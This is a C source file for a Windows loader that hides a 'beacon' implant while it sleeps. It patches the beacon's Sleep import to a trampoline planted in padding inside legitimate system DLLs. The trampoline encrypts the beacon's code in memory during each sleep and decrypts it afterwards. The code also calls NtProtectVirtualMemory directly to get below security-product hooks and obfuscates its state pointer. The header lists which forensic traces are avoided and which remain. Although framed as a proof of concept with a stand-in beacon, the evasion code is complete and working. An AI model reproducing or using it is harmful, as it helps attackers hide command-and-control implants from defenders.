// x86_64-w64-mingw32-gcc -shared -Wall -Wextra -fcf-protection -o beacon.dll beacon.c
// x86_64-w64-mingw32-gcc -Wall -Wextra -fcf-protection -o faulty.exe faulty.c
//
// faulty: the IAT-hook trampoline.
//
// First cut fused the payload and the mask into one 18-byte loop with
// a baked-in call through a vtable.  Proved the shape, but you can't
// swap in a real beacon without rewriting both halves.
//
// This version hooks the beacon's own sleep import instead.  We walk
// its IAT, find the Sleep entry, and point it at a trampoline living
// in a host .text padding run.  The beacon calls "Sleep", lands in
// our stub, and never knows:
//
//     mask(); RealSleep(ms); decrypt(); ret     back into the beacon
//
// One 83-byte stub.  Saves rcx/rdx/r8/r9 across mask(), restores
// them for the real call, stashes rax across decrypt(), returns.
// Same code for Sleep, SleepEx, WaitForSingleObject,
// NtDelayExecution — pick the IAT entry, not the stub.  State
// pointer is an imm64 patched in at setup; no VEH, no masker thread,
// no CAS machine; program order on the beacon's own thread is the
// whole lock.
//
// The beacon's call pushes its return onto both stacks; the
// trampoline's ret pops exactly that.  CET-safe by construction.
//
// Three regions, same page story as before:
//
//   - beacon .text flips RW while masked, RX at rest;
//   - the trampoline sits on a different page so it can still run
//     while the beacon's pages are RW;
//   - state prefers a host .data zero-run (MEM_IMAGE VAD), falls
//     back to private RW.
//
// While sleeping the stack reads:
//
//     ntdll <- kernel32!Sleep <- trampoline (host .text) <- beacon_main
//
// The loader binary is in none of those frames.  mask() and decrypt()
// have either returned or haven't run yet.
//
// Still visible, to be honest:
//   (a) the patched IAT entry;
//   (b) the trampoline byte-diff in the host (ModifiedModule);
//   (c) raw state pointer sitting in the trampoline code;
//   (d) two NtProtectVirtualMemory calls per cycle (ETW);
//   (e) everything else on the beacon's .text pages loses execute
//       for the sleep window;
//   (f) a private-RW VAD when no .data slot turns up.
//
// Demo: beacon.dll is a stand-in that loops on Sleep(1500).  The
// scanner thread watches region bytes and tick counts.  Neither ships.
// So this is a proof of concept to base real testing on...
//
#include <windows.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <stddef.h>

// ---- state: function pointers for the trampoline + masking metadata ----------
typedef struct {
    void *fn_mask;                       // +0x00  tramp: call [rbx+0x00]
    void *fn_sleep;                      // +0x08  tramp: call [rbx+0x08]
    void *fn_decrypt;                    // +0x10  tramp: call [rbx+0x10]
    void *region;                        // +0x18  beacon .text base
    size_t region_len;                   // +0x20  beacon .text length
    volatile LONG state;                 // +0x28  display label (0=plain 1=masked)
    unsigned char key[16];               // +0x2C  only valid while masked
} beacon_state;
_Static_assert(offsetof(beacon_state, fn_mask)    == 0x00, "tramp call [rbx+0x00]");
_Static_assert(offsetof(beacon_state, fn_sleep)   == 0x08, "tramp call [rbx+0x08]");
_Static_assert(offsetof(beacon_state, fn_decrypt) == 0x10, "tramp call [rbx+0x10]");

// ---- sleep targets: which IAT import to hook ---------------------------------
typedef struct { const char *dll; const char *func; } sleep_target;
static const sleep_target TARGETS[] = {
    { "kernel32.dll", "Sleep" },
    { "kernel32.dll", "SleepEx" },
    { "kernel32.dll", "WaitForSingleObject" },
    { "ntdll.dll",    "NtDelayExecution" },
};
#define NTARGETS (int)(sizeof TARGETS / sizeof TARGETS[0])

// ---- host modules: already loaded, padding not prologues ---------------------
static const char *HOSTS[] = { "combase.dll", "rpcrt4.dll", "ucrtbase.dll" };
#define NHOSTS (int)(sizeof HOSTS / sizeof HOSTS[0])

// ---- obfuscated state pointer ------------------------------------------------
static unsigned char g_cookie[8];
static unsigned long long g_desc_obf;
#define DESC() ((beacon_state *)(uintptr_t)(g_desc_obf ^ (*(unsigned long long *)g_cookie & 0x0000FFFFFFFFFFFFULL)))

// ---- NtProtectVirtualMemory: below the kernel32/kernelbase hook layers -------
typedef LONG (NTAPI *NtProtect_t)(HANDLE, PVOID *, SIZE_T *, ULONG, ULONG *);
static NtProtect_t pNtProtectVirtualMemory;
static int vp(void *base, size_t len, DWORD prot) {
    PVOID b = base; SIZE_T n = len; DWORD old;
    if (pNtProtectVirtualMemory)
        return pNtProtectVirtualMemory(GetCurrentProcess(), &b, &n, prot, &old) >= 0;
    return VirtualProtect(base, len, prot, &old);
}

// ---- CSPRNG: OS entropy per cycle --------------------------------------------
typedef void (NTAPI *ProcessPrng_t)(PVOID, size_t);
static ProcessPrng_t pProcessPrng;

// ---- mask / decrypt: sequential, one thread, program order is the lock -------
static void mask(void) {
    beacon_state *d = DESC();
    pProcessPrng(d->key, sizeof d->key);
    if (!vp(d->region, d->region_len, PAGE_READWRITE)) {
        SecureZeroMemory(d->key, sizeof d->key);
        return;
    }
    unsigned char *p = d->region;
    for (size_t i = 0; i < d->region_len; i++) p[i] ^= d->key[i % 16];
    d->state = 1;
}

static void decrypt(void) {
    beacon_state *d = DESC();
    if (!vp(d->region, d->region_len, PAGE_READWRITE)) return;
    unsigned char *p = d->region;
    for (size_t i = 0; i < d->region_len; i++) p[i] ^= d->key[i % 16];
    SecureZeroMemory(d->key, sizeof d->key);
    vp(d->region, d->region_len, PAGE_EXECUTE_READ);
    d->state = 0;
}

// ---- trampoline (83 bytes) ---------------------------------------------------
// Saves rcx/rdx/r8/r9, calls mask(), restores args for the real sleep,
// stashes rax, calls decrypt(), restores rax, returns.  State pointer
// patched as imm64 at offset 11.
//
//   +0  F3 0F 1E FA   endbr64           IBT landing pad
//   +4  53            push  rbx          callee-save + 16-align rsp
//   +5  48 83 EC 40   sub   rsp, 0x40   shadow (0x20) + save area (0x20)
//   +9  48 BB <imm64> mov   rbx, <state> patched at setup
//  +19  48 89 4C 24 20 mov  [rsp+0x20], rcx   save arg1
//  +24  48 89 54 24 28 mov  [rsp+0x28], rdx   save arg2
//  +29  4C 89 44 24 30 mov  [rsp+0x30], r8    save arg3
//  +34  4C 89 4C 24 38 mov  [rsp+0x38], r9    save arg4
//  +39  FF 13          call [rbx+0x00]         mask()
//  +41  48 8B 4C 24 20 mov  rcx, [rsp+0x20]   restore args
//  +46  48 8B 54 24 28 mov  rdx, [rsp+0x28]
//  +51  4C 8B 44 24 30 mov  r8,  [rsp+0x30]
//  +56  4C 8B 4C 24 38 mov  r9,  [rsp+0x38]
//  +61  FF 53 08       call [rbx+0x08]         real sleep
//  +64  48 89 44 24 20 mov  [rsp+0x20], rax   save retval
//  +69  FF 53 10       call [rbx+0x10]         decrypt()
//  +72  48 8B 44 24 20 mov  rax, [rsp+0x20]   restore retval
//  +77  48 83 C4 40    add  rsp, 0x40
//  +81  5B             pop  rbx
//  +82  C3             ret                     -> beacon, plain + RX
static const unsigned char TRAMP[] = {
    0xF3,0x0F,0x1E,0xFA,
    0x53,
    0x48,0x83,0xEC,0x40,
    0x48,0xBB, 0,0,0,0,0,0,0,0,
    0x48,0x89,0x4C,0x24,0x20,
    0x48,0x89,0x54,0x24,0x28,
    0x4C,0x89,0x44,0x24,0x30,
    0x4C,0x89,0x4C,0x24,0x38,
    0xFF,0x13,
    0x48,0x8B,0x4C,0x24,0x20,
    0x48,0x8B,0x54,0x24,0x28,
    0x4C,0x8B,0x44,0x24,0x30,
    0x4C,0x8B,0x4C,0x24,0x38,
    0xFF,0x53,0x08,
    0x48,0x89,0x44,0x24,0x20,
    0xFF,0x53,0x10,
    0x48,0x8B,0x44,0x24,0x20,
    0x48,0x83,0xC4,0x40,
    0x5B,
    0xC3,
};
#define TRAMP_LEN       (sizeof TRAMP)
#define TRAMP_STATE_OFF 11
_Static_assert(sizeof TRAMP == 83, "trampoline length pinned");

// ---- find a padding run (0xCC or 0x90) in a code section ---------------------
static int find_run(unsigned char *p, DWORD vs, DWORD need, unsigned char **out) {
    DWORD run = 0;
    for (DWORD j = 0; j < vs; j++) {
        if (p[j] == 0xCC || p[j] == 0x90) {
            if (++run >= need) { *out = p + j - need + 1; return 1; }
        } else run = 0;
    }
    return 0;
}

// ---- find a trampoline slot in a host .text ----------------------------------
static int find_tramp_slot(unsigned char **tramp_out) {
    for (int h = 0; h < NHOSTS; h++) {
        HMODULE m = GetModuleHandleA(HOSTS[h]);
        if (!m) m = LoadLibraryA(HOSTS[h]);
        if (!m) continue;
        IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)m;
        IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)((BYTE *)m + dos->e_lfanew);
        IMAGE_SECTION_HEADER *s = IMAGE_FIRST_SECTION(nt);
        for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, s++) {
            if (!(s->Characteristics & IMAGE_SCN_CNT_CODE)) continue;
            if (find_run((unsigned char *)m + s->VirtualAddress,
                         s->Misc.VirtualSize, (DWORD)TRAMP_LEN, tramp_out))
                return 1;
        }
    }
    return 0;
}

// ---- find a zero run in a host .data (RW, MEM_IMAGE) -------------------------
static void *find_data_slot(size_t need) {
    for (int h = 0; h < NHOSTS; h++) {
        HMODULE m = GetModuleHandleA(HOSTS[h]);
        if (!m) m = LoadLibraryA(HOSTS[h]);
        if (!m) continue;
        IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)m;
        IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)((BYTE *)m + dos->e_lfanew);
        IMAGE_SECTION_HEADER *s = IMAGE_FIRST_SECTION(nt);
        for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, s++) {
            if (!(s->Characteristics & IMAGE_SCN_CNT_INITIALIZED_DATA)) continue;
            if (!(s->Characteristics & IMAGE_SCN_MEM_WRITE)) continue;
            unsigned char *base = (unsigned char *)m + s->VirtualAddress;
            DWORD sz = s->Misc.VirtualSize, run = 0;
            for (DWORD j = 0; j < sz; j++) {
                if (base[j] == 0) { if (++run >= need) return base + j - need + 1; }
                else run = 0;
            }
        }
    }
    return NULL;
}

// ---- one-time write to a .text page: temp-RW, memcpy, restore ---------------
static int write_text(void *dst, const void *src, size_t n) {
    DWORD old;
    if (!VirtualProtect(dst, n, PAGE_READWRITE, &old)) return 0;
    memcpy(dst, src, n);
    DWORD tmp;
    VirtualProtect(dst, n, old, &tmp);
    return 1;
}

// ---- IAT hook: patch one import entry to point at the trampoline -------------
static int hook_iat(HMODULE mod, const char *dll_name, const char *func_name,
                    void *hook, void **original) {
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)mod;
    IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)((BYTE *)mod + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY *dir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (!dir->VirtualAddress) return 0;

    IMAGE_IMPORT_DESCRIPTOR *imp =
        (IMAGE_IMPORT_DESCRIPTOR *)((BYTE *)mod + dir->VirtualAddress);
    for (; imp->Name; imp++) {
        if (_stricmp((const char *)((BYTE *)mod + imp->Name), dll_name) != 0)
            continue;
        DWORD hint_rva = imp->OriginalFirstThunk
                       ? imp->OriginalFirstThunk : imp->FirstThunk;
        IMAGE_THUNK_DATA *hint =
            (IMAGE_THUNK_DATA *)((BYTE *)mod + hint_rva);
        IMAGE_THUNK_DATA *iat  =
            (IMAGE_THUNK_DATA *)((BYTE *)mod + imp->FirstThunk);

        for (; hint->u1.AddressOfData; hint++, iat++) {
            if (IMAGE_SNAP_BY_ORDINAL(hint->u1.Ordinal)) continue;
            IMAGE_IMPORT_BY_NAME *name = (IMAGE_IMPORT_BY_NAME *)
                ((BYTE *)mod + hint->u1.AddressOfData);
            if (strcmp((const char *)name->Name, func_name) != 0) continue;

            *original = (void *)(uintptr_t)iat->u1.Function;
            DWORD old;
            VirtualProtect(&iat->u1.Function, sizeof(void *),
                           PAGE_READWRITE, &old);
            iat->u1.Function = (ULONG_PTR)hook;
            DWORD tmp;
            VirtualProtect(&iat->u1.Function, sizeof(void *), old, &tmp);
            return 1;
        }
    }
    return 0;
}

// ---- locate the beacon's first code section ----------------------------------
static int find_beacon_text(HMODULE mod, void **base, size_t *len) {
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)mod;
    IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)((BYTE *)mod + dos->e_lfanew);
    IMAGE_SECTION_HEADER *s = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, s++) {
        if (!(s->Characteristics & IMAGE_SCN_CNT_CODE)) continue;
        *base = (unsigned char *)mod + s->VirtualAddress;
        *len  = s->Misc.VirtualSize;
        return 1;
    }
    return 0;
}

// ---- scanner (DEMO ONLY) -----------------------------------------------------
DWORD WINAPI scanner(LPVOID a) {
    volatile unsigned long long *ticks = (volatile unsigned long long *)a;
    beacon_state *d = DESC();
    int last = -2; unsigned long long last_tick = 0;
    for (;;) {
        unsigned char b = 0; SIZE_T got = 0;
        ReadProcessMemory(GetCurrentProcess(), d->region, &b, 1, &got);
        if (got && (int)b != last) {
            printf("[scan]   region[0]=%#04x (%s)\n", b,
                   d->state ? "ciphertext" : "plaintext");
            last = b;
        }
        if (ticks && *ticks != last_tick)
            printf("[scan]   beacon alive: tick %llu\n", (last_tick = *ticks));
        Sleep(50);
    }
    return 0;
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);

    // ---- resolve imports -----------------------------------------------------
    pNtProtectVirtualMemory = (NtProtect_t)(void *)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
    pProcessPrng = (ProcessPrng_t)(void *)GetProcAddress(
        LoadLibraryA("bcryptprimitives.dll"), "ProcessPrng");
    if (!pProcessPrng) {
        printf("[setup]  ProcessPrng resolve failed\n");
        return 1;
    }

    // ---- cookie for obfuscated state pointer ---------------------------------
    pProcessPrng(g_cookie, sizeof g_cookie);
    unsigned long long ck; memcpy(&ck, g_cookie, 8);
    ck &= 0x0000FFFFFFFFFFFFULL;

    // ---- load the beacon DLL -------------------------------------------------
    HMODULE hBeacon = LoadLibraryA("beacon.dll");
    if (!hBeacon) {
        printf("[setup]  failed to load beacon.dll (%lu)\n", GetLastError());
        return 1;
    }
    typedef void (*beacon_main_t)(void);
    beacon_main_t pfnBeacon =
        (beacon_main_t)(void *)GetProcAddress(hBeacon, "beacon_main");
    volatile unsigned long long *ticks = (volatile unsigned long long *)
        GetProcAddress(hBeacon, "beacon_tick_count");
    if (!pfnBeacon) {
        printf("[setup]  beacon_main export not found\n");
        return 1;
    }

    // ---- find the beacon's .text (the region we'll mask) ---------------------
    void *beacon_text = NULL; size_t beacon_text_len = 0;
    if (!find_beacon_text(hBeacon, &beacon_text, &beacon_text_len)) {
        printf("[setup]  beacon .text section not found\n");
        return 1;
    }

    // ---- trampoline: host .text padding (preferred) or private page ----------
    unsigned char *tramp_slot = NULL;
    int tramp_image = find_tramp_slot(&tramp_slot);
    if (!tramp_image) {
        printf("[setup]  no %u-byte padding run — private trampoline fallback\n",
               (unsigned)TRAMP_LEN);
        tramp_slot = VirtualAlloc(NULL, 0x1000,
                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!tramp_slot) {
            printf("[setup]  trampoline alloc failed\n");
            return 1;
        }
    }

    // ---- state: host .data padding (MEM_IMAGE) or private RW -----------------
    beacon_state *st = (beacon_state *)find_data_slot(sizeof(beacon_state));
    int state_image = (st != NULL);
    if (!st)
        st = (beacon_state *)VirtualAlloc(NULL, 0x1000,
                                          MEM_COMMIT | MEM_RESERVE,
                                          PAGE_READWRITE);
    if (!st) {
        printf("[setup]  state alloc failed\n");
        return 1;
    }
    g_desc_obf = (unsigned long long)(uintptr_t)st ^ ck;

    // ---- populate state (fn_sleep filled by hook_iat below) ------------------
    st->fn_mask    = (void *)mask;
    st->fn_sleep   = NULL;
    st->fn_decrypt = (void *)decrypt;
    st->region     = beacon_text;
    st->region_len = beacon_text_len;
    st->state      = 0;

    // ---- build trampoline with patched state pointer -------------------------
    unsigned char tramp_code[sizeof TRAMP];
    memcpy(tramp_code, TRAMP, sizeof TRAMP);
    uintptr_t st_addr = (uintptr_t)st;
    memcpy(tramp_code + TRAMP_STATE_OFF, &st_addr, 8);

    if (tramp_image) {
        if (!write_text(tramp_slot, tramp_code, TRAMP_LEN)) {
            printf("[setup]  trampoline write to host .text failed\n");
            return 1;
        }
    } else {
        memcpy(tramp_slot, tramp_code, TRAMP_LEN);
        if (!vp(tramp_slot, TRAMP_LEN, PAGE_EXECUTE_READ)) {
            printf("[setup]  trampoline page flip failed\n");
            return 1;
        }
    }

    // ---- hook the beacon's sleep import -> trampoline ------------------------
    void *real_sleep = NULL;
    int hooked = 0;
    for (int t = 0; t < NTARGETS && !hooked; t++) {
        hooked = hook_iat(hBeacon, TARGETS[t].dll, TARGETS[t].func,
                          tramp_slot, &real_sleep);
        if (hooked)
            printf("[setup]  hooked %s!%s -> trampoline\n",
                   TARGETS[t].dll, TARGETS[t].func);
    }
    if (!hooked) {
        printf("[setup]  no hookable sleep import found in beacon IAT\n");
        return 1;
    }
    st->fn_sleep = real_sleep;

    // ---- sanity: trampoline must not share a page with the masked region -----
    uintptr_t rgn_first = (uintptr_t)beacon_text >> 12;
    uintptr_t rgn_last  = ((uintptr_t)beacon_text + beacon_text_len - 1) >> 12;
    uintptr_t trp_page  = (uintptr_t)tramp_slot >> 12;
    if (trp_page >= rgn_first && trp_page <= rgn_last) {
        printf("[setup]  BUG: trampoline shares a page with masked region\n");
        return 1;
    }

    printf("[setup]  region %p (%llu bytes, beacon .text), "
           "tramp %p (%s), state %p (%s)\n"
           "[setup]  no VEH, no masker thread; "
           "mask/sleep/decrypt in beacon's own program order\n",
           beacon_text, (unsigned long long)beacon_text_len,
           (void *)tramp_slot, tramp_image ? "image padding" : "private",
           (void *)st, state_image ? "image .data" : "private RW");

    // ---- launch --------------------------------------------------------------
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pfnBeacon, NULL, 0, NULL);
    CreateThread(NULL, 0, scanner, (LPVOID)ticks, 0, NULL);

    Sleep(20000);
    return 0;
}
